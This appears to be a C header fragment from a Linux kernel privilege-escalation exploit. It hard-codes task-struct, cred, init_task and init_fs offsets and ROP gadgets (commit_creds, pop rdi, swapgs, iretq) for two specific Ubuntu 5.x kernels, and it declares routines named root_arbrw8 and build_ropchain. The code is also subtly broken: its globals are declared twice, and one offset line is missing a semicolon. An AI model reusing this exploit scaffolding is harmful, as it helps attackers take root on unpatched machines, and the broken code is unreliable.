/* -------------- ARBITRARY KERNEL READ/WRITE ------------------ */

off_t INIT_TASK;
off_t TASK_LINKS_OFFSET;
off_t TASK_PID_OFFSET;
off_t TASK_THREADPID_OFFSET;
off_t PID_NUMBERS_OFFSET;
off_t TASK_CRED_OFFSET;

off_t CRED_USERNS_OFFSET;
off_t INIT_USER_NS;
off_t TASK_FS_OFFSET;
off_t INIT_FS;

off_t KERNEL_CRED_OFF;
off_t COMMIT_CRED_OFF;
off_t POP_RDI_OFF;
off_t POP_RSI_OFF;
off_t SWAPGS_OFF;
off_t IRETQ_OFF;

#ifdef KERNEL_5_0_0_38_generic
off_t INIT_TASK = 0x1617740;
off_t TASK_LINKS_OFFSET = 0x7a8;
off_t TASK_PID_OFFSET = 0x8a8;
off_t TASK_THREADPID_OFFSET = 0x910;
off_t PID_NUMBERS_OFFSET = 0x38;
off_t TASK_CRED_OFFSET = 0xa48;

off_t CRED_USERNS_OFFSET = 0x88;
off_t INIT_USER_NS = 0x16584c0;
off_t TASK_FS_OFFSET = 0xa90;
off_t INIT_FS = 0x170a480;

#else

#ifdef KERNEL_5_8_0_48_generic
off_t INIT_TASK = 0x1614840;
off_t TASK_LINKS_OFFSET = 0x7e0;
off_t TASK_PID_OFFSET = 0x8e0;
off_t TASK_THREADPID_OFFSET = 0x948;
off_t PID_NUMBERS_OFFSET = 0x60;
off_t TASK_CRED_OFFSET = 0xa88;

off_t CRED_USERNS_OFFSET = 0x88;
off_t INIT_USER_NS = 0x165b460;
off_t TASK_FS_OFFSET = 0xad8;
off_t INIT_FS = 0x1717180;

off_t KERNEL_CRED_OFF = 0xc9110;
off_t COMMIT_CRED_OFF = 0xc8c80;
off_t POP_RDI_OFF = 0x89250;
off_t POP_RSI_OFF = 0x1abaae
off_t SWAPGS_OFF = 0x75ef0;
off_t IRETQ_OFF = 0x3a0fb;

#else

#error "No supported kernel version #define'd"

#endif // KERNEL_5_8_0_48_generic

#endif // KERNEL_5_0_0_38_generic

int root_arbrw8(uintptr_t kernbase, uint64_t(*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value));

void build_ropchain(uint64_t kbase, uint64_t *rop_ptr);
